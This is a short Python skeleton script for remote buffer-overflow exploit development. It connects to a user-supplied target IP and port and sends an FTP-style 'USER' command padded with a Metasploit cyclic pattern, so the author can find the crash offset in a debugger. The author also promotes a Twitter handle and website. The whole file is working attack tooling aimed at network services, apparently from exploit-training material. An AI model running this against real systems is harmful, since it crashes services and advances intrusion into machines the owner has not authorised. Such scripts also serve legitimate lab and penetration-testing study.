#!/usr/bin/python

#SKELETON SCRIPT FOR FUZZING SOFTWARES REMOTELY, USEFUL FOR OVERFLOWS OVER THE NETWORK
#CREATE YOUR CHOICE OF PATTERN USING /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <length>
#Follow me on twitter @acc3ssp0int

import socket
import sys
import time


if len(sys.argv) < 3:
	print("Usage: python 02-pattern_overwrite.py $TargetIP $Port")
	sys.exit(1)

host = str(sys.argv[1])
port = int(sys.argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

cmd = 'USER ' #Modify This as per software
#Modify This as per buffer sent in 01-fuzzer.py
junk = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq'
end = '\r\n' #Modify This as per software

buffer = cmd + junk + end

print("Created by acc3ssp0int, follow my content on https://acc3ssp0int.com, Thanks!")
time.sleep(3)
print("Passing Buffer in 3 seconds...")
time.sleep(3)
s.connect((host,port))
s.recv(1024)
s.send(buffer)
s.recv(1024)
s.close()
print("Done! Check your debugger :)")
time.sleep(1)
print("Exiting...")
time.sleep(1)
